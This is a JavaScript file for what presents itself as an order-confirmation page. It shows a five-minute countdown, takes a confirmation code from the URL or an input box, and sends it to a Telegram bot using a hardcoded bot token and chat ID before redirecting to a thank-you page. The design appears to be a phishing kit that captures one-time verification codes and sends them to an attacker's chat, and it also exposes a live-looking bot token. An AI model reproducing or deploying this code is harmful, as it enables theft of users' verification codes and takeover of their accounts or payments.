// Add JavaScript code here
const confirmationCodeInput = document.getElementById('confirmationCodeInput');
const confirmOrderBtn = document.getElementById('confirmOrderBtn');
const countdown = document.getElementById('countdown');

// Get the confirmation code from the URL parameter
const urlParams = new URLSearchParams(window.location.search);
const confirmationCode = urlParams.get('code');

if (confirmationCode) {
    // If a confirmation code is provided in the URL, display it in the input field
    confirmationCodeInput.value = confirmationCode;
}

let minutes = 5;
let seconds = 0;

const updateCountdown = () => {
    countdown.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
};

const timer = setInterval(() => {
    if (minutes === 0 && seconds === 0) {
        clearInterval(timer);
    } else {
        if (seconds === 0) {
            minutes--;
            seconds = 59;
        } else {
            seconds--;
        }
        updateCountdown();
    }
}, 1000);

confirmOrderBtn.addEventListener('click', () => {
    const confirmationCode = confirmationCodeInput.value;
    if (confirmationCode) {
        // Send the confirmation code to the Telegram bot
        sendConfirmationCodeToTelegramBot(confirmationCode);

        // Redirect to the "Thank You" page
        window.location.href = 'thankyou.html';
    }
});

function sendConfirmationCodeToTelegramBot(confirmationCode) {
    const botToken = '6780796808:AAEMjYut3HZtDuZWfjabfV2-kxPEI57BiLs';
    const chatId = '1204315551';
    const message = `Customer entered confirmation code: ${confirmationCode}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then((response) => {
        if (!response.ok) {
            console.error('Failed to send message to Telegram bot:', response.statusText);
        }
    })
    .catch((error) => {
        console.error('Error sending message to Telegram bot:', error);
    });
}
